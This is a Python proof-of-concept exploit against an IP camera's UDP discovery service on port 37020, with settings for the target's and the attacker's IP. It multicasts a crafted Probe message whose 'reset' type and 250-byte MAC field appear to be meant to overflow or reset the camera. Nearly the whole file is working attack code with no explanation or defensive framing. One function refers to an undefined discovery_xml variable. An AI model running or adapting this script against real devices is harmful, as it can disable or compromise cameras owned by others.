from socket import socket, AF_INET, SOCK_DGRAM, SOL_SOCKET, SO_REUSEADDR, SO_BROADCAST, timeout

############################# Update! ################################
target_ip="10.42.0.106"                                              # IP address of your cam
host_ip="10.42.0.1"                                                  # Attacker IP
######################################################################

time_out = 1
udp_bcast = '239.255.255.250'
udp_port = 37020

def send(custom_xml):
    global time_out,udp_port,udp_bcast
    s = socket(AF_INET, SOCK_DGRAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
    s.settimeout(time_out)
    s.bind((host_ip ,0))
    r = s.sendto(custom_xml, (udp_bcast,udp_port ))
    print(r)
    udps = []
    while True:
        try:
            udps.append(s.recv(1024))
        except timeout:
            print("Received %d udp packets(s) in %ds timeout window." % (len(udps),time_out))
            break
    s.close()
    return

def discover_cameras_udp():
    global time_out,discovery_xml,udp_port,udp_bcast
    s = socket(AF_INET, SOCK_DGRAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
    s.settimeout(time_out)
    s.bind((host_ip,0))
    print("Sending discovery UDP broadcast packet...")
    r = s.sendto(discovery_xml, (udp_bcast,udp_port ))
    print(r)
    udps = []
    while True:
        try:
            udps.append(s.recv(1024))
        except timeout:
            print("Received %d udp packets(s) in %ds timeout window." % (len(udps),time_out))
            break
    s.close()
    return udps

custom_xml = b'<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>'+ b'9FE48835-D590-48CA-A960-2221A91C9028'+b'</Uuid><Types>reset</Types><MAC>' + b'a' * 250 + b'</MAC></Probe>'
print("\nSending: ")
print(custom_xml)
send(custom_xml)